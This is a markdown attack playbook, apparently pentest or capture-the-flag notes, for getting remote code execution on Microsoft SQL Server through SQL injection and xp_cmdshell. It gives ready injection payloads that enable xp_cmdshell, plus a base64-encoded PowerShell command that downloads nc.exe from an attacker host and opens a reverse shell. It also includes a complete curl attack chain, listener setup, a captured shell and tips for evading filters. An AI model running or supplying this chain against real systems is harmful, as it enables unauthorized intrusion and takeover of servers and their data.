# 💻 MSSQL Remote Code Execution

## Overview

If running as `sa` user or with sufficient permissions, MSSQL can execute arbitrary system commands via `xp_cmdshell`.

---

## Step 1: Verify Permissions

### Check sysadmin Role

```sql
IS_SRVROLEMEMBER('sysadmin')
```

Returns:
- `1` = Has sysadmin role
- `0` = Does not have role

### SQLi Payload

```sql
maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--
```

**Response**: `taken` = We have sysadmin! ✅

### Using cURL

```bash
# URL encode
printf %s "maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--" | jq -rR @uri

# Send request
curl -s "http://<TARGET>/api/check-username.php?u=maria'%20AND%20IS_SRVROLEMEMBER('sysadmin')%3D1%3B--"
```

---

## Step 2: Enable xp_cmdshell

### Enable Advanced Options First

```sql
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;
```

**SQLi Payload**:
```sql
';exec sp_configure 'show advanced options','1';reconfigure;--
```

### Enable xp_cmdshell

```sql
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
```

**SQLi Payload**:
```sql
';exec sp_configure 'xp_cmdshell','1';reconfigure;--
```

---

## Step 3: Test Command Execution

### Ping Test

```sql
EXEC xp_cmdshell 'ping /n 4 <ATTACKER_IP>';
```

**SQLi Payload**:
```sql
';exec xp_cmdshell 'ping /n 4 192.168.43.164';--
```

### Verify with tcpdump

```bash
sudo tcpdump -i tun0 icmp
```

**Expected Output**:
```
ICMP echo request, id 1, seq 1, length 40
ICMP echo reply, id 1, seq 1, length 40
ICMP echo request, id 1, seq 2, length 40
ICMP echo reply, id 1, seq 2, length 40
...
```

4 ICMP pairs = **xp_cmdshell working!** ✅

---

## Step 4: Get Reverse Shell

### PowerShell Payload

```powershell
(new-object net.webclient).downloadfile("http://<ATTACKER_IP>/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv <ATTACKER_IP> 9999 -e c:\windows\system32\cmd.exe;
```

### Encode Payload (Base64 UTF-16LE)

```bash
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.75:9001/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 10.10.15.75 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

**Output**: `KABuAGUAdwAtAG8AYgBqAGUAYwB0AC...`

### Final SQLi Payload

```sql
exec xp_cmdshell 'powershell -exec bypass -enc <BASE64_PAYLOAD>'
```

---

## Attack Setup

### 1. Download nc.exe

```bash
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

### 2. Start HTTP Server

```bash
python3 -m http.server 9001
```

### 3. Start Netcat Listener

```bash
nc -nvlp 9002
```

### 4. Send Payload

```bash
curl -s "http://<TARGET>/api/check-username.php?u=<URL_ENCODED_PAYLOAD>"
```

### 5. Receive Shell

```
Ncat: Connection from 10.129.208.121.
Microsoft Windows [Version 10.0.20348.1366]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---

## Complete Attack Chain

```bash
# Step 1: Check sysadmin
curl -s "http://<TARGET>/api/check-username.php?u=maria'%20AND%20IS_SRVROLEMEMBER('sysadmin')%3D1%3B--"

# Step 2: Enable advanced options
curl -s "http://<TARGET>/api/check-username.php?u='EXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--"

# Step 3: Enable xp_cmdshell
curl -s "http://<TARGET>/api/check-username.php?u='EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--"

# Step 4: Test with ping
curl -s "http://<TARGET>/api/check-username.php?u='EXEC%20xp_cmdshell%20'ping%20%2Fn%204%20<ATTACKER_IP>'--"

# Step 5: Reverse shell
curl -s "http://<TARGET>/api/check-username.php?u='EXEC%20xp_cmdshell%20'powershell.exe%20-exec%20bypass%20-enc%20<BASE64>'--"
```

---

## URL Encoding Helper

```bash
# Encode payload
printf %s "YOUR_PAYLOAD_HERE" | jq -rR @uri
```

---

## PowerShell Encoding

### Why Encode?

- Avoid quotation mark issues
- Bypass basic filters
- Cleaner payload delivery

### Encoding Steps

1. Write PowerShell command
2. Convert to UTF-16LE
3. Base64 encode
4. Use with `-enc` flag

### One-liner Template

```bash
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

### Alternative: Raikia's Hub

Online encoder (may be offline): https://raikia.com/tool-powershell-encoder/

---

## xp_cmdshell Reference

### Default Execution Context

Commands run as: `nt service\mssqlserver`

### Alternative Shells

```sql
-- PowerShell
nc.exe -nv <IP> <PORT> -e C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe

-- cmd.exe
nc.exe -nv <IP> <PORT> -e c:\windows\system32\cmd.exe
```

---

## Troubleshooting

### xp_cmdshell Not Working

1. Verify sysadmin role
2. Check if advanced options enabled
3. Try different xp_cmdshell syntax
4. Check firewall/network connectivity

### Reverse Shell Not Connecting

1. Verify ports are open
2. Check if nc.exe downloaded
3. Try different payload encoding
4. Use alternative reverse shell methods

### Permission Denied

- May need different user context
- Try proxy account configuration
- Escalate privileges first

---

## Quick Reference

### Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Execute Command

```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir c:\';
EXEC xp_cmdshell 'powershell -enc <BASE64>';
```

### Check Permissions

```sql
IS_SRVROLEMEMBER('sysadmin')
```

